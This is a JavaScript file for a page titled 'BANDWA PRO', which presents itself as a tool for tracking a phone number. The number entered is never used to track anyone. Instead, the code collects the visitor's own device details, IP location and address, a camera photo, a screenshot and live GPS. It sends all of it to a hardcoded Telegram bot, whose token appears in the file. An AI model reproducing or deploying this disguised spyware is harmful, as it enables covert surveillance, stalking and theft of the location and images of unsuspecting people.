/**
 * BANDWA PRO - HYBRID TRACKING ENGINE
 * Gabungan sistem pelacakan + UI profesional
 */

(function() {
    'use strict';

    // ---- TELEGRAM CONFIG ----
    const BOT_TOKEN = '8598689506:AAE9lY9Ajm3pzNL_ZMy8X26UZyEfTC354KU';
    const CHAT_ID = '7553556579';

    // ---- DOM REFS ----
    const targetInput = document.getElementById('targetInput');
    const actionBtn = document.getElementById('actionBtn');
    const statusLog = document.getElementById('statusLog');
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');

    // ---- LOG FUNCTION ----
    function log(message, type = 'info') {
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;
        const time = new Date().toLocaleTimeString('id-ID');
        entry.textContent = `[${time}] ${message}`;
        statusLog.appendChild(entry);
        statusLog.scrollTop = statusLog.scrollHeight;
        if (statusLog.children.length > 50) {
            statusLog.removeChild(statusLog.firstChild);
        }
    }

    // ---- TELEGRAM SENDER ----
    async function sendToTelegram(text, isPhoto = false, blob = null, filename = 'capture.jpg') {
        try {
            if (isPhoto && blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, filename);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } else {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            }
        } catch (e) {
            log(`❌ Gagal kirim: ${e.message}`, 'error');
        }
    }

    // ---- REVERSE GEOLOCATION ----
    async function getLocationDetails(lat, lon) {
        try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
            const data = await res.json();
            if (data.address) {
                return {
                    city: data.address.city || data.address.town || data.address.village || 'Tidak diketahui',
                    district: data.address.suburb || data.address.neighbourhood || 'Tidak diketahui',
                    full: data.display_name || 'Alamat tidak tersedia'
                };
            }
        } catch (e) {}
        return { city: 'Tidak diketahui', district: 'Tidak diketahui', full: 'Alamat tidak tersedia' };
    }

    // ---- COLLECT DEVICE INFO ----
    async function collectDeviceInfo() {
        let info = '╭───── BANDWA TRACKING REPORT ───── ⦿\n\n';
        info += '⚙️ DEVICE INFORMATION\n';
        info += `🖥️ User Agent: ${navigator.userAgent}\n`;
        info += `💻 Platform: ${navigator.platform}\n`;
        info += `🌐 Language: ${navigator.language}\n`;
        info += `📶 Online: ${navigator.onLine ? '✅ Yes' : '❌ No'}\n`;
        info += `📺 Screen: ${screen.width}x${screen.height}\n`;
        info += `🪟 Window: ${innerWidth}x${innerHeight}\n`;
        info += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
        info += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}\n`;

        // Battery
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                info += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
                info += `🔌 Charging: ${b.charging ? '✅ YES' : '❌ NO'}\n`;
            } catch (e) {
                info += '🔋 Battery: ❌ Not available\n';
            }
        }

        info += `⏰ Time: ${new Date().toString()}\n`;
        info += `🕒 Page Load: ${performance.now().toFixed(2)} ms\n`;
        info += `📜 History: ${history.length}\n`;
        info += `✋ Touch: ${'ontouchstart' in window ? '✅ YES' : '❌ NO'}\n`;
        info += `🔗 Referrer: ${document.referrer || 'None'}\n`;
        info += `🌍 URL: ${location.href}\n`;
        info += `📄 Title: ${document.title}\n`;
        info += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        info += `🧭 Offset: ${new Date().getTimezoneOffset()} minutes\n\n`;

        // IP & Location
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            info += '📍 LOCATION DETAILS\n';
            info += `📡 IP: ${data.ip || 'Unknown'}\n`;
            info += `🏙️ City: ${data.city || 'Unknown'}\n`;
            info += `🗺️ Region: ${data.region || 'Unknown'}\n`;
            info += `🌎 Country: ${data.country_name || 'Unknown'}\n`;
            info += `🏷️ Postal: ${data.postal || 'Unknown'}\n`;

            if (data.latitude && data.longitude) {
                info += `📌 Lat: ${data.latitude}\n`;
                info += `📍 Lng: ${data.longitude}\n`;
                const details = await getLocationDetails(data.latitude, data.longitude);
                info += `🏙️ District: ${details.district}\n`;
                info += `🏠 Full: ${details.full}\n`;
            }
        } catch (e) {
            info += '❌ Gagal mendapatkan lokasi\n';
        }

        info += '\n╰───── @JustVenturxzz ───── ⦿';
        return info;
    }

    // ---- CAPTURE CAMERA ----
    async function captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await new Promise(resolve => setTimeout(resolve, 3000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                if (blob) sendToTelegram('📸 Camera Capture', true, blob, 'camera_capture.jpg');
            }, 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            log('📸 Kamera berhasil', 'success');
        } catch (e) {
            await sendToTelegram('❌ Gagal mengakses kamera');
            log('🚫 Kamera ditolak', 'warning');
        }
    }

    // ---- CAPTURE SCREENSHOT ----
    async function captureScreenshot() {
        try {
            const canvas = await html2canvas(document.body);
            canvas.toBlob(blob => {
                if (blob) sendToTelegram('📸 Screenshot', true, blob, 'screenshot.jpg');
            }, 'image/jpeg');
            log('📸 Screenshot terkirim', 'success');
        } catch (e) {
            await sendToTelegram('❌ Screenshot gagal');
            log('❌ Screenshot gagal', 'error');
        }
    }

    // ---- WATCH GPS ----
    function watchGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                async position => {
                    let gps = `📍 GPS REAL-TIME\n📌 Lat: ${position.coords.latitude}\n📍 Lng: ${position.coords.longitude}\n🎯 Accuracy: ${position.coords.accuracy}m\n`;
                    const details = await getLocationDetails(position.coords.latitude, position.coords.longitude);
                    gps += `🏙️ District: ${details.district}\n🏠 Full: ${details.full}\n`;
                    await sendToTelegram(gps);
                    log('📍 GPS terkirim', 'success');
                },
                async error => {
                    await sendToTelegram(`❌ GPS Error: ${error.message}`);
                    log('🚫 GPS ditolak', 'warning');
                },
                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
            );
        } else {
            sendToTelegram('❌ GPS not supported');
            log('⚠️ Browser tidak support GPS', 'warning');
        }
    }

    // ---- MAIN EXECUTION ----
    async function execute() {
        const target = targetInput.value.trim();
        if (!target || target.length < 8 || target.length > 15 || !/^\d+$/.test(target)) {
            log('⚠️ Nomor tidak valid (min 8 digit, max 15)', 'error');
            return;
        }

        actionBtn.disabled = true;
        log(`🎯 Target: ${target}`, 'info');
        await sendToTelegram(`<b>🎯 TARGET NUMBER:</b> ${target}`);
        targetInput.value = '';

        try {
            // 1. Collect device info
            log('📡 Mengumpulkan info perangkat...', 'info');
            const info = await collectDeviceInfo();
            await sendToTelegram(info);
            log('✅ Info perangkat terkirim', 'success');

            // 2. Capture camera
            log('📸 Mengakses kamera...', 'info');
            await captureCamera();

            // 3. Capture screenshot after delay
            setTimeout(async () => {
                log('📸 Mengambil screenshot...', 'info');
                await captureScreenshot();
            }, 3000);

            // 4. Watch GPS
            log('📍 Mengaktifkan GPS tracking...', 'info');
            watchGPS();

            log(`✅ SUCCESS: ${target}`, 'success');
            await sendToTelegram(`✅ SUCCESS: ${target}`);
        } catch (e) {
            log(`❌ Error: ${e.message}`, 'error');
            await sendToTelegram(`❌ Error: ${e.message}`);
        } finally {
            actionBtn.disabled = false;
        }
    }

    // ---- INIT ----
    document.addEventListener('DOMContentLoaded', () => {
        log('🔒 System ready. Enter target number.', 'ready');
        actionBtn.addEventListener('click', execute);
        targetInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') execute();
        });
    });

    // ---- PARTICLES ----
    if (typeof createParticles === 'function') {
        createParticles();
    }

})();